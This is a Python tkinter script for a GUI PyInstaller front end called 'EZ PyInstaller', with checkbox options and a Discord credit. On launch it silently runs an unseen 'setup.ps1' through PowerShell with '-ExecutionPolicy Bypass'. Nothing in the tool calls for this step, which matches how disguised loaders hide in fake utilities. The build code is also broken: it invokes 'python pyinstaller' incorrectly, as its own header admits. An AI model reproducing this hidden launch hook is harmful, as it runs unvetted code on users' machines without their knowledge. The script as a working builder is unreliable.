# This script is broken the exe doesnt wanna build but add onto it if you wanna

import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import os
import shutil

os.system("powershell -ExecutionPolicy Bypass -File setup.ps1")

root = tk.Tk()
root.title("EZ PyInstaller")
root.geometry("960x660")
root.configure(bg="#1c1c1c")
root.resizable(False, False)

file_path_var = tk.StringVar()
icon_path_var = tk.StringVar()
output_path_var = tk.StringVar()
no_console_var = tk.BooleanVar()
clean_var = tk.BooleanVar()
debug_var = tk.BooleanVar()
run_after_var = tk.BooleanVar()
require_admin_var = tk.BooleanVar()
one_folder_var = tk.BooleanVar()
show_build_folder_var = tk.BooleanVar()
make_log_var = tk.BooleanVar()

def ensure_pyinstaller():
    subprocess.run(["python", "-m", "pip", "install", "pyinstaller"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def pick_script(): file_path_var.set(filedialog.askopenfilename(filetypes=[("Python Files", "*.py")]))
def pick_icon(): icon_path_var.set(filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")]))
def pick_output(): output_path_var.set(filedialog.askdirectory())

def create_spec(script, exe_name):
    manifest = ""
    if require_admin_var.get():
        manifest = """
exe.manifest = '''
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
'''
"""
    return f"""
block_cipher = None

a = Analysis(['{script}'],
             pathex=[],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)

exe = EXE(a.pure, a.zipped_data,
          a.scripts,
          [],
          name='{exe_name}',
          debug={debug_var.get()},
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          console={str(not no_console_var.get()).lower()})
{manifest}
"""

def build_script():
    ensure_pyinstaller()
    script = file_path_var.get()
    icon = icon_path_var.get()
    output_dir = output_path_var.get() or os.getcwd()
    if not script or not os.path.exists(script):
        messagebox.showerror("Error", "Select a valid .py file")
        return
    exe_name = os.path.splitext(os.path.basename(script))[0]
    spec_path = exe_name + ".spec"
    with open(spec_path, "w") as f:
        f.write(create_spec(script, exe_name))
    args = ["python", "pyinstaller", spec_path]
    if icon: args += ["--icon", icon]
    args.append("--onedir" if one_folder_var.get() else "--onefile")
    try:
        log_output = subprocess.PIPE if make_log_var.get() else None
        result = subprocess.run(args, stdout=log_output, stderr=log_output, text=True)
        if make_log_var.get():
            with open("build_log.txt", "w", encoding="utf-8") as log_file:
                log_file.write(result.stdout or "")
        final_exe = os.path.join("dist", exe_name + ".exe")
        if os.path.exists(final_exe):
            shutil.move(final_exe, os.path.join(output_dir, exe_name + ".exe"))
            if clean_var.get():
                shutil.rmtree("build", ignore_errors=True)
                shutil.rmtree("dist", ignore_errors=True)
                if os.path.exists(spec_path): os.remove(spec_path)
            status.config(text=f"Built: {exe_name}.exe", fg="#ff00ff")
            if run_after_var.get():
                subprocess.Popen(os.path.join(output_dir, exe_name + ".exe"))
            if show_build_folder_var.get():
                os.startfile(os.path.join(os.getcwd(), "build"))
        else:
            status.config(text="Build failed", fg="#ff00ff")
    except Exception as e:
        messagebox.showerror("Build Error", str(e))

def styled_checkbox(parent, text, variable):
    tk.Checkbutton(parent, text=text, variable=variable,
                   font=("Segoe UI", 10), bg="#1c1c1c", fg="#ff00ff",
                   selectcolor="#1c1c1c", activebackground="#1c1c1c",
                   activeforeground="#ff00ff", cursor="hand2",
                   indicatoron=True, anchor="w").pack(anchor="w", padx=10, pady=6)

frame = tk.Frame(root, bg="#1c1c1c")
frame.place(x=40, y=30, width=500)

tk.Label(frame, text="EZ PyInstaller", bg="#1c1c1c", fg="#ff00ff",
         font=("Segoe UI", 18, "bold")).pack(pady=10)

tk.Label(frame, text="Python Script", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 10)).pack(anchor="w")
tk.Entry(frame, textvariable=file_path_var, font=("Segoe UI", 10), bg="#2e2e2e", fg="#ff00ff", relief="flat").pack(fill="x", ipady=5, pady=4)
tk.Button(frame, text="Browse .py", command=pick_script, bg="#2e2e2e", fg="#ff00ff", relief="flat", cursor="hand2").pack(fill="x", pady=4)

tk.Label(frame, text="Icon File (optional)", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 10)).pack(anchor="w", pady=(10, 0))
tk.Entry(frame, textvariable=icon_path_var, font=("Segoe UI", 10), bg="#2e2e2e", fg="#ff00ff", relief="flat").pack(fill="x", ipady=5, pady=4)
tk.Button(frame, text="Browse .ico", command=pick_icon, bg="#2e2e2e", fg="#ff00ff", relief="flat", cursor="hand2").pack(fill="x", pady=4)

tk.Label(frame, text="Output Folder", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 10)).pack(anchor="w", pady=(10, 0))
tk.Entry(frame, textvariable=output_path_var, font=("Segoe UI", 10), bg="#2e2e2e", fg="#ff00ff", relief="flat").pack(fill="x", ipady=5, pady=4)
tk.Button(frame, text="Browse Folder", command=pick_output, bg="#2e2e2e", fg="#ff00ff", relief="flat", cursor="hand2").pack(fill="x", pady=4)

tk.Button(frame, text="Build", command=build_script, font=("Segoe UI", 10, "bold"),
          bg="#2e2e2e", fg="#ff00ff", relief="flat", cursor="hand2").pack(fill="x", pady=(20, 10))

status = tk.Label(frame, text="", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 10))
status.pack(pady=(10, 10))

side_panel = tk.Frame(root, bg="#1c1c1c")
side_panel.place(x=600, y=30)

tk.Label(side_panel, text="Options", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(10, 4))
styled_checkbox(side_panel, "Hide CMD window", no_console_var)
styled_checkbox(side_panel, "Clean up build files after done", clean_var)
styled_checkbox(side_panel, "Include extra info for fixing errors", debug_var)
styled_checkbox(side_panel, "Run EXE after build", run_after_var)
styled_checkbox(side_panel, "Request Admin Privileges", require_admin_var)
styled_checkbox(side_panel, "Use one-folder mode", one_folder_var)
styled_checkbox(side_panel, "Show build folder", show_build_folder_var)
styled_checkbox(side_panel, "Make logs txt file", make_log_var)

tk.Label(root, text="V2", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 9)).place(x=20, y=640)
tk.Label(root, text="King(@indieun2) on Discord", bg="#1c1c1c", fg="#ff00ff", font=("Segoe UI", 9)).place(x=700, y=640)

root.mainloop()
